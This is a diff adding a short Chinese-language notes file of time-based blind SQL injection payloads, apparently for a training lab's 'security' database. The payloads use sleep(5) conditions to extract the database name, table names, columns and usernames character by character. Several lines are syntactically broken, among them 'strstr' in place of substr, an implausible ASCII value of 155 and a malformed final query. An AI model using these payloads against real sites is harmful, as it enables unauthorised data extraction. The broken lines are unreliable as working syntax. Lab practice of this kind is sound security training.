@@ -1,0 +1,25 @@
+前提是对语句进行闭合!!!
+基本语句:
+if(ascii(substr(database(),1,1))>115,0,sleep(5)) 真则0，假执行sleep
+
+当前数据库：
+猜测数据库：
+第一位：
+and if(ascii(substr(database(),1,1))=155,1,sleep(5))--+
+第二位：
+and if((substr(database(),2,1))='e',1,sleep(5))--+
+猜测security数据库中的表
+猜测第一张表的第一位是e
+if(ascii(strstr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)=101,1,sleep(5))--+
+
+猜测第二张表的第一位
+if(ascii(strstr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1)=101,1,sleep(5))--+
+
+猜测user表的列
+if (ascii(substr((select column_name from information_schema.columns where table_name='user' limit 0,1),1,1)=105,1,sleep(5))--+
+
+猜测username的值
+if(ascii(substr(select username from username limit 0,1)1,1)=68,1,sleep(5))--+
+
+
+
